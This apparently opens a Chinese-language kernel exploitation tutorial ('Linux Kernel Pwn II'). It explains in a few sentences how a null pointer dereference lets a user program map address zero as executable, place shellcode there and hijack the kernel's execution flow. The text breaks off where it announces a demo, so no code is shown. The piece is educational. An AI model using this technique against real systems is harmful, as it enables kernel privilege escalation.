Linux Kernel Pwn Ⅱ：Null Pointer Dereference

简单介绍Null Pointer Dereference这个古老的漏洞

空指针解引用类漏洞是比较早的一类漏洞，问题在于某些指针未经初始化验证直接使用，导致执行0地址处指令

若是在用户程序中申请0地址处执行，赋予可执行权限，并写入shellcode，则劫持执行流

写一个demo来说明这个漏洞
